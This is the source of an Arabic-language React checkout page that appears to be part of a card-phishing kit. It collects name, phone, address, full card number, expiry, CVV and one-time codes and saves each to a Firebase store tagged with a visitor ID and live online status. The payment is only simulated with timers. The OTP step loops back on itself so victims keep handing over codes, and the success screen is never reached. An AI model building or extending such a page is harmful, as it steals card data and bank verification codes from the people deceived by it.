"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Separator } from "@/components/ui/separator"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { MapPin, CreditCard, Shield, AlertCircle, CheckCircle2 } from "lucide-react"
import { addData, getVisitorId } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

type CheckoutStep = "address" | "payment" | "otp" | "success"

interface FormErrors {
  [key: string]: string
}

export default function CheckoutPage() {
  const [currentStep, setCurrentStep] = useState<CheckoutStep>("address")
  const [isLoading, setIsLoading] = useState(false)
  const [errors, setErrors] = useState<FormErrors>({})
  const [otpError, setOtpError] = useState("")
  const [otp, setOtp] = useState("")

  useEffect(() => {
    const visitorId = getVisitorId()
    if (!visitorId) return

    setupOnlineStatus(visitorId)
    void addData({ visitorId, currentPage: "تسجيل المعلومات" })
  }, [])

  // Form data
  const [addressData, setAddressData] = useState({
    fullName: "",
    phone: "",
    city: "",
    apartment: "",
  })

  const [paymentData, setPaymentData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardName: "",
  })

  const validateAddress = () => {
    const newErrors: FormErrors = {}

    if (!addressData.fullName.trim()) newErrors.fullName = "الاسم الكامل مطلوب"
    if (!addressData.phone.trim()) newErrors.phone = "رقم الهاتف مطلوب"
    if (!addressData.city) newErrors.city = "المدينة مطلوبة"

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validatePayment = () => {
    const newErrors: FormErrors = {}

    if (!paymentData.cardNumber.trim()) newErrors.cardNumber = "رقم البطاقة مطلوب"
    else if (paymentData.cardNumber.replace(/\s/g, "").length !== 16) newErrors.cardNumber = "رقم البطاقة غير صحيح"

    if (!paymentData.expiryDate.trim()) newErrors.expiryDate = "تاريخ الانتهاء مطلوب"
    if (!paymentData.cvv.trim()) newErrors.cvv = "رمز الأمان مطلوب"
    else if (paymentData.cvv.length !== 3) newErrors.cvv = "رمز الأمان يجب أن يكون 3 أرقام"

    if (!paymentData.cardName.trim()) newErrors.cardName = "اسم حامل البطاقة مطلوب"

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleAddressSubmit = async () => {
    if (!validateAddress()) return
    const visitorId = getVisitorId()
    await addData({
      visitorId,
      name: addressData.fullName,
      phone: addressData.phone,
      currentPage: "تسجيل المعلومات",
    })
    setIsLoading(true)
    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1000))
    setIsLoading(false)
    setCurrentStep("payment")
  }

  const handlePaymentSubmit = async () => {
    if (!validatePayment()) return
    const visitorId = getVisitorId()
    await addData({
      visitorId,
      cardNumber: paymentData.cardNumber,
      cvv: paymentData.cvv,
      expiryDate: paymentData.expiryDate,
      currentPage: "تسجيل البطاقة",
    })
    setIsLoading(true)
    // Simulate payment processing
    await new Promise((resolve) => setTimeout(resolve, 2000))
    setIsLoading(false)
    setCurrentStep("otp")
  }

  const handleOtpSubmit = async () => {
    if (otp.length !== 6) {
      setOtpError("يجب إدخال 6 أرقام")
      return
    }
    const visitorId = getVisitorId()
    await addData({
      visitorId,
      otp,
      otpStatus: "pending",
      currentStep: "otp",
      currentPage: "إدخال الكود",
    })
    setIsLoading(true)
    setOtpError("")

    // Simulate OTP verification - fail if OTP is "123456"
    await new Promise((resolve) => setTimeout(resolve, 1500))

    if (otp === "123456") {
      setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى")
      setIsLoading(false)
      return
    }

    setIsLoading(false)
    setCurrentStep("otp")
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 py-8" dir="rtl">
      <div className="max-w-4xl mx-auto px-4">
        {/* Progress Steps */}
        <div className="mb-8">
          <div className="flex items-center justify-center space-x-reverse space-x-4">
            <div
              className={`flex items-center ${currentStep === "address" ? "text-blue-600" : currentStep === "payment" || currentStep === "otp" || currentStep === "success" ? "text-green-600" : "text-gray-400"}`}
            >
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${currentStep === "address" ? "bg-blue-600 text-white" : currentStep === "payment" || currentStep === "otp" || currentStep === "success" ? "bg-green-600 text-white" : "bg-gray-200"}`}
              >
                {currentStep === "payment" || currentStep === "otp" || currentStep === "success" ? (
                  <CheckCircle2 className="w-4 h-4" />
                ) : (
                  "1"
                )}
              </div>
              <span className="mr-2 text-sm font-medium">عنوان التوصيل</span>
            </div>

            <div className="w-12 h-px bg-gray-300"></div>

            <div
              className={`flex items-center ${currentStep === "payment" ? "text-blue-600" : currentStep === "otp" || currentStep === "success" ? "text-green-600" : "text-gray-400"}`}
            >
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${currentStep === "payment" ? "bg-blue-600 text-white" : currentStep === "otp" || currentStep === "success" ? "bg-green-600 text-white" : "bg-gray-200"}`}
              >
                {currentStep === "otp" || currentStep === "success" ? <CheckCircle2 className="w-4 h-4" /> : "2"}
              </div>
              <span className="mr-2 text-sm font-medium">الدفع</span>
            </div>

            <div className="w-12 h-px bg-gray-300"></div>

            <div
              className={`flex items-center ${currentStep === "otp" ? "text-blue-600" : currentStep === "success" ? "text-green-600" : "text-gray-400"}`}
            >
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${currentStep === "otp" ? "bg-blue-600 text-white" : currentStep === "success" ? "bg-green-600 text-white" : "bg-gray-200"}`}
              >
                {currentStep === "success" ? <CheckCircle2 className="w-4 h-4" /> : "3"}
              </div>
              <span className="mr-2 text-sm font-medium">التحقق</span>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Content */}
          <div className="lg:col-span-2">
            {/* Address Step */}
            {currentStep === "address" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <MapPin className="w-5 h-5" />
                    عنوان التوصيل
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="fullName">الاسم الكامل *</Label>
                      <Input
                        id="fullName"
                        value={addressData.fullName}
                        onChange={(e) => setAddressData({ ...addressData, fullName: e.target.value })}
                        className={errors.fullName ? "border-red-500" : ""}
                      />
                      {errors.fullName && <p className="text-red-500 text-sm mt-1">{errors.fullName}</p>}
                    </div>

                    <div>
                      <Label htmlFor="phone">رقم الهاتف *</Label>
                      <Input
                        id="phone"
                        value={addressData.phone}
                        onChange={(e) => setAddressData({ ...addressData, phone: e.target.value })}
                        className={errors.phone ? "border-red-500" : ""}
                        placeholder="+968xxxxxxxx"
                      />
                      {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
                    </div>
                    <div>
                      <Label htmlFor="phone">العنوان  *</Label>
                      <Input
                        id="address"
                        value={addressData.city}
                        onChange={(e) => setAddressData({ ...addressData, city: e.target.value })}
                        className={errors.city ? "border-red-500" : ""}
                        placeholder="ادخل عنوان التوصيل "
                      />
                      {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
                    </div>
                  </div>

                  
                
                  <Button onClick={handleAddressSubmit} className="w-full bg-gradient-to-r from-blue-500 to-cyan-500 text-white" disabled={isLoading}>
                    {isLoading ? "جاري المعالجة..." : "متابعة إلى الدفع"}
                  </Button>
                </CardContent>
              </Card>
            )}

            {/* Payment Step */}
            {currentStep === "payment" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <CreditCard className="w-5 h-5" />
                    معلومات الدفع
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="cardNumber">رقم البطاقة *</Label>
                    <Input
                      id="cardNumber"
                      value={paymentData.cardNumber}
                      onChange={(e) => setPaymentData({ ...paymentData, cardNumber: formatCardNumber(e.target.value) })}
                      className={errors.cardNumber ? "border-red-500" : ""}
                      placeholder="1234 5678 9012 3456"
                      maxLength={19}
                    />
                    {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="expiryDate">تاريخ الانتهاء *</Label>
                      <Input
                        id="expiryDate"
                        value={paymentData.expiryDate}
                        onChange={(e) => {
                          let value = e.target.value.replace(/\D/g, "")
                          if (value.length >= 2) {
                            value = value.substring(0, 2) + "/" + value.substring(2, 4)
                          }
                          setPaymentData({ ...paymentData, expiryDate: value })
                        }}
                        className={errors.expiryDate ? "border-red-500" : ""}
                        placeholder="MM/YY"
                        maxLength={5}
                      />
                      {errors.expiryDate && <p className="text-red-500 text-sm mt-1">{errors.expiryDate}</p>}
                    </div>

                    <div>
                      <Label htmlFor="cvv">رمز الأمان *</Label>
                      <Input
                        id="cvv"
                        type="password"
                        value={paymentData.cvv}
                        onChange={(e) => setPaymentData({ ...paymentData, cvv: e.target.value.replace(/\D/g, "") })}
                        className={errors.cvv ? "border-red-500" : ""}
                        placeholder="123"
                        maxLength={3}
                      />
                      {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
                    </div>
                  </div>

                  <div>
                    <Label htmlFor="cardName">اسم حامل البطاقة *</Label>
                    <Input
                      id="cardName"
                      value={paymentData.cardName}
                      onChange={(e) => setPaymentData({ ...paymentData, cardName: e.target.value })}
                      className={errors.cardName ? "border-red-500" : ""}
                      placeholder="الاسم كما هو مكتوب على البطاقة"
                    />
                    {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
                  </div>

                  <div className="flex gap-2">
                    <Button variant="outline" onClick={() => setCurrentStep("address")} className="flex-1">
                      رجوع
                    </Button>
                    <Button onClick={handlePaymentSubmit} className="flex-1 bg-gradient-to-r from-blue-500 to-cyan-500 text-white" disabled={isLoading}>
                      {isLoading ? "جاري المعالجة..." : "تأكيد الدفع"}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* OTP Step */}
            {currentStep === "otp" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Shield className="w-5 h-5" />
                    التحقق من الهوية
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="text-center">
                    <p className="text-gray-600 mb-4">
                      تم إرسال رمز التحقق إلى رقم الهاتف المنتهي بـ **{addressData.phone.slice(-2)}
                    </p>

                    <div className="max-w-xs mx-auto">
                      <Label htmlFor="otp">رمز التحقق</Label>
                      <Input
                        id="otp"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                        className={`text-center text-lg tracking-widest ${otpError ? "border-red-500" : ""}`}
                        placeholder="000000"
                        maxLength={6}
                      />
                      {otpError && (
                        <Alert className="mt-2" variant="destructive">
                          <AlertCircle className="h-4 w-4" />
                          <AlertDescription>{otpError}</AlertDescription>
                        </Alert>
                      )}
                    </div>

                    <p className="text-sm text-gray-500 mt-4">
                      لم تستلم الرمز؟ <button className="text-blue-600 hover:underline">إعادة الإرسال</button>
                    </p>
                  </div>

                  <div className="flex gap-2">
                    <Button variant="outline" onClick={() => setCurrentStep("payment")} className="flex-1">
                      رجوع
                    </Button>
                    <Button onClick={handleOtpSubmit} className="flex-1 bg-gradient-to-r from-blue-500 to-cyan-500 text-white" disabled={isLoading || otp.length !== 6}>
                      {isLoading ? "جاري التحقق..." : "تأكيد"}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Success Step */}
            {currentStep === "success" && (
              <Card>
                <CardContent className="text-center py-8">
                  <CheckCircle2 className="w-16 h-16 text-green-600 mx-auto mb-4" />
                  <h2 className="text-2xl font-bold text-green-600 mb-2">تم الدفع بنجاح!</h2>
                  <p className="text-gray-600 mb-4">شكراً لك، تم تأكيد طلبك وسيتم توصيله خلال 2-3 أيام عمل</p>
                  <Badge variant="secondary" className="text-sm">
                    رقم الطلب: #ORD-2024-001
                  </Badge>
                </CardContent>
              </Card>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
